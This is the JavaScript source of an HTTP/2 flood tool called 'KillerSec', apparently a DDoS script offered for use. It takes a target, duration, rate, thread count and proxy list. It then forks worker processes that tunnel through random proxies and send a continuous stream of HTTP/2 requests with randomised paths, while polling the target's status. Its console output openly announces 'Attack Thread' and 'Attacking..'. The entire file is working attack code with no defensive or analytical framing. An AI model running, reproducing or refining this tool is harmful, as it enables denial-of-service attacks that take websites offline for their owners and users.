const net = require('net');
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require('crypto');
const fs = require('fs');
const {
  HeaderGenerator
} = require('header-generator');
const axios = require("axios");
const https = require("https");

process.setMaxListeners(0x0);
require("events").EventEmitter.defaultMaxListeners = 0x0;
process.on("uncaughtException", function (_0x2fe61e) {});

if (process.argv.length < 0x7) {
  console.log("   ");
  console.log("   ");
  console.log("         [0m█─▄▀ ▀█▀ █── █── █▀▀ █▀▀█ █▀▀ █▀▀ █▀▀ ");
  console.log("         [0m█▀▄── █─ █── █── █▀▀ █▄▄▀ ▀▀█ █▀▀ █── ");
  console.log("         [0m▀──▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀─▀▀ ▀▀▀ ▀▀▀ ▀▀▀ ");
  console.log(" [0;33m     ╚═════╦════════════════════════════════════════════╦═════╝   ");
  console.log(" [0;33m           ║            [0mAuthor : [31m! D a r k n e s x z       [0;33m║  ");
  console.log(" [0;33m           ║            [0mStatus : [32mKillerSec Active          [0;33m║  ");
  console.log(" [0;33m           ╚════════════════════════════════════════════╝");
  console.log("   ");
  console.log("[0m[34m[[1m[0m![0m[34m][1m[0m[1m[0m node[1m[33m KillerSec [1m[32m<HOST> <TIME> <RPS> <THREADS> <PROXY>.");
  console.log("[0m[34m[[1m[0m![0m[34m][1m[0m[1m[0m Made by [1m[31mKillerSec Team");
  console.log("[0m[34m[[1m[0m![0m[34m][1m[0m[1m[0m Update your proxy every 1 week :[1m[33m node scraper.js[1m[0m");
  process.exit();
}

const headers = {};
function readLines(_0x1e1d9e) {
  return fs.readFileSync(_0x1e1d9e, "utf-8").toString().split(/\r?\n/);
}

const getCurrentTime = () => {
  const _0x485e4f = new Date();
  const _0x3bfd1e = _0x485e4f.getHours().toString().padStart(0x2, '0');
  const _0x2e3dd7 = _0x485e4f.getMinutes().toString().padStart(0x2, '0');
  const _0x1dab76 = _0x485e4f.getSeconds().toString().padStart(0x2, '0');
  return "[31m([32m" + _0x3bfd1e + ':' + _0x2e3dd7 + ':' + _0x1dab76 + "[31m)[0m";
};

const targetURL = process.argv[0x2];
const agent = new https.Agent({
  'rejectUnauthorized': false
});

function getStatus() {
  const _0xae62a0 = new Promise((_0x5b720d, _0x2d4da4) => {
    setTimeout(() => {
      _0x2d4da4(new Error("[31mRequest timed out"));
    }, 0x1388);
  });
  const _0x1e737b = axios.get(targetURL, {
    'httpsAgent': agent
  });
  Promise.race([_0x1e737b, _0xae62a0]).then(_0xe9d4c6 => {
    const {
      status: _0x18b827,
      data: _0x95bcd0
    } = _0xe9d4c6;
    console.log("[31m[[33mKillerSec[31m][0m " + getCurrentTime() + " [32m> [0mTitle: " + getTitleFromHTML(_0x95bcd0) + " ([32m" + _0x18b827 + "[0m)");
  })["catch"](_0x218cc3 => {
    if (_0x218cc3.message === "[31mRequest timed out[0m") {
      console.log("[31m[[33mKillerSec[31m][0m " + getCurrentTime() + " [32m> [31mRequest Timed Out[0m");
    } else {
      if (_0x218cc3.response) {
        const _0x37e1f8 = getTitleFromHTML(_0x218cc3.response.data);
        console.log("[31m[[33mKillerSec[31m][0m " + getCurrentTime() + " [32m> [0mTitle: " + _0x37e1f8 + " ([31m" + _0x218cc3.response.status + "[0m)");
      } else {
        console.log("[31m[[33mKillerSec[31m][0m " + getCurrentTime() + " [32m> Error Connecting [0m");
      }
    }
  });
}

function getTitleFromHTML(_0x2b591e) {
  const _0x3360e9 = /<title>(.*?)<\/title>/i;
  const _0x3b8acc = String(_0x2b591e).match(_0x3360e9);
  if (_0x3b8acc && _0x3b8acc[0x1]) {
    return _0x3b8acc[0x1];
  }
  return "Not Found";
}

function randomIntn(_0x1c4ac1, _0x5a8974) {
  return Math.floor(Math.random() * (_0x5a8974 - _0x1c4ac1) + _0x1c4ac1);
}

function randstr(_0x10a13d) {
  var _0xd7654d = '';
  var _0x2274ee = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".length;
  for (var _0x39f582 = 0x0; _0x39f582 < _0x10a13d; _0x39f582++) {
    _0xd7654d += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(Math.floor(Math.random() * _0x2274ee));
  }
  return _0xd7654d;
}

function randayat(_0x592524) {
  var _0x1d622e = '';
  var _0x4ed612 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".length;
  for (var _0x298fde = 0x0; _0x298fde < _0x592524; _0x298fde++) {
    _0x1d622e += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(Math.floor(Math.random() * _0x4ed612));
  }
  return _0x1d622e;
}

function randnombor(_0x4c172f) {
  var _0x519787 = '';
  var _0x1a96db = "0123456789".length;
  for (var _0x2e404d = 0x0; _0x2e404d < _0x4c172f; _0x2e404d++) {
    _0x519787 += "0123456789".charAt(Math.floor(Math.random() * _0x1a96db));
  }
  return _0x519787;
}

const spoofed = Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff);

const args = {
  'target': process.argv[0x2],
  'time': ~~process.argv[0x3],
  'Rate': ~~process.argv[0x4],
  'threads': ~~process.argv[0x5],
  'proxyFile': process.argv[0x6]
};

if (cluster.isMaster) {
  console.clear();
  console.log("\n\n[0m█─▄▀ ▀█▀ █── █── █▀▀ █▀▀█ █▀▀ █▀▀ █▀▀ \n[0m█▀▄── █─ █── █── █▀▀ █▄▄▀ ▀▀█ █▀▀ █── \n[0m▀──▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀─▀▀ ▀▀▀ ▀▀▀ ▀▀▀ [31m v1.0[0m ");
  console.log("[33m--------------------------------------------");
  console.log("[31m-> [0mTarget[33m : [32m" + args.target);
  console.log("[31m-> [0mTime[33m : [32m" + args.time);
  console.log("[31m-> [0mThreads[33m : [32m" + args.threads);
  console.log("[33m--------------------------------------------");
  console.log("[31m-> [0mAuthor[33m : [32m! D a r k n e s x z");
  console.log("[33m--------------------------------------------");

  for (let i = 0x1; i <= args.threads; i++) {
    cluster.fork();
    console.log("[31m[[33mKillerSec[31m] [0m" + getCurrentTime() + " Attack Thread " + i + " Started");
  }

  console.log("[31m[[33mKillerSec[31m] [0m" + getCurrentTime() + " [33mKillerSec Attacking..");
  setInterval(getStatus, 0x7d0);

  setTimeout(() => {
    console.log("[31m[[33mKillerSec[31m] [0m" + getCurrentTime() + " [33mThe Attack Is Over[0m");
    process.exit(0x1);
  }, args.time * 0x3e8);
} else {
  let headerGenerator = new HeaderGenerator({
    'browsers': ["firefox", "opera", "edge", "chrome", "safari"],
    'devices': ["desktop", "mobile"],
    'operatingSystems': ['windows', 'linux', "macos", "android", 'ios']
  });

  const pathts = ["?s=", '/?', '', "?q=", '?true=', '?', '/', "?page=1", "?category=news"];
  const cplist = ["ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-ECDSA-CHACHA20-POLY1305"];
  const accept_header = ["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"];
  const lang_header = ['ko-KR', "en-US", "pt-BR", "ja-JP"];
  const encoding_header = ["gzip, deflate, br"];
  const control_header = ["max-age=0", "no-cache", "no-store"];
  const Methods = ["GET", "POST", "HEAD"];
  const queryString = ['', '&', '?', '&&'];
  const sechuas = ['Android', "Windows", "Linux", "iOS"];
  const browsers = ["Google Chrome", "Firefox", "Safari"];

  var proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/);
  const parsedTarget = url.parse(args.target);

  setInterval(() => {
    runFlooder(proxies, parsedTarget, Methods, pathts, queryString, randstr, control_header, encoding_header, lang_header, accept_header, sechuas, browsers);
  });
}

class NetSocket {
  ["HTTP"](_0x1dc768, _0x256212) {
    const _0xa5e623 = "CONNECT " + _0x1dc768.address + ":443 HTTP/1.1\r\nHost: " + _0x1dc768.address + ":443\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n";
    const _0x185236 = Buffer.from(_0xa5e623);
    const _0x230278 = net.connect({
      'host': _0x1dc768.host,
      'port': _0x1dc768.port
    });
    _0x230278.setTimeout(_0x1dc768.timeout * 0x2710);
    _0x230278.on("connect", () => {
      _0x230278.write(_0x185236);
    });
    _0x230278.on("data", _0x1118ac => {
      if (!_0x1118ac.toString().includes("HTTP/1.1 200")) {
        _0x230278.destroy();
        return _0x256212(undefined, "error");
      }
      return _0x256212(_0x230278, undefined);
    });
    _0x230278.on("error", () => {
      _0x230278.destroy();
    });
  }
}

const Socker = new NetSocket();

function runFlooder(proxies, parsedTarget, Methods, pathts, queryString, randstr, control_header, encoding_header, lang_header, accept_header, sechuas, browsers) {
  const _0x1fb314 = proxies[Math.floor(Math.random() * proxies.length)];
  if (!_0x1fb314) return;
  const _0x45028a = _0x1fb314.split(':');
  
  const _0x32c453 = {
    'host': _0x45028a[0x0],
    'port': ~~_0x45028a[0x1],
    'address': parsedTarget.host,
    'timeout': 0x64
  };

  Socker.HTTP(_0x32c453, (_0x376c19, _0x528991) => {
    if (_0x528991 || !_0x376c19) return;

    const _0x5d80e8 = {
      'host': parsedTarget.host,
      'port': 0x1bb,
      'secure': true,
      'ALPNProtocols': ['h2', "http/1.1"],
      'rejectUnauthorized': false,
      'servername': parsedTarget.host,
      'socket': _0x376c19
    };

    const _0x3b317e = tls.connect(0x1bb, parsedTarget.host, _0x5d80e8);

    _0x3b317e.on('secureConnect', () => {
      const _0x696160 = http2.connect(parsedTarget.href, {
        'createConnection': () => _0x3b317e
      });

      const reqHeaders = {
        ":method": Methods[Math.floor(Math.random() * Methods.length)],
        ":authority": parsedTarget.host,
        ":path": parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + randstr(5),
        ":scheme": "https",
        "accept": accept_header[0],
        "accept-encoding": encoding_header[0],
        "accept-language": lang_header[Math.floor(Math.random() * lang_header.length)],
        "cache-control": control_header[0],
        "user-agent": "KillerSec/1.0 (X11; Linux x86_64)"
      };

      const req = _0x696160.request(reqHeaders);
      req.end();
      req.on('response', () => {
        req.close();
      });
    });
  });
}
